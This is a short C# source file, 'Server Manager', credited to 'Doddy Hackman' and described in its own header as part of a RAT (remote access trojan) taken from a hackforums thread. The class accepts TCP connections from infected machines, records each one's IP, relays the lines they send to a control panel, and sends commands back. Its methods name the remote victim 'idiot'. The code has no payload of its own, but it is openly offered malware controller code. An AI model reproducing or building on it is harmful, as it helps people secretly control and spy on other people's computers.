// Server Manager
// Coded By Doddy Hackman
// Credits :
// Rat Based on : http://www.hackforums.net/showthread.php?tid=827069v
// Thanks to xSilent

using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.IO;
using System.Windows.Forms;
using System.Text.RegularExpressions;

namespace builder
{
    class ServerManager
    {
        public TcpClient manager;
        public string ip;

        public delegate void cargando_datos(ServerManager manager, string Message);
        public event cargando_datos evento_panel_control_now;

        public ServerManager(TcpClient manager)
        {
            this.manager = manager;
            string datos = manager.Client.RemoteEndPoint.ToString();
            Match regex = Regex.Match(datos, "(.*):(.*)", RegexOptions.IgnoreCase);
            if (regex.Success)
            {
                ip = regex.Groups[1].Value;

            }

            manager.GetStream().BeginRead(new byte[] { 0 }, 0, 0, leo_al_idiot, null);
        }
        void leo_al_idiot(IAsyncResult contenido_leyendo)
        {
            try
            {
                StreamReader leyendo_now = new StreamReader(manager.GetStream());
                string mensaje_leyendo_now = leyendo_now.ReadLine();
                evento_panel_control_now(this, mensaje_leyendo_now);
                manager.GetStream().BeginRead(new byte[] { 0 }, 0, 0, leo_al_idiot, null);
            }
            catch
            {
                //
            }

        }

        public void respondo_al_idiot(string mensaje_now)
        {
            try
            {
                StreamWriter te_mando_now = new StreamWriter(manager.GetStream());
                te_mando_now.WriteLine(mensaje_now);
                te_mando_now.Flush();
            }
            catch
            {
                //
            }
        }

    }
}

// The End ?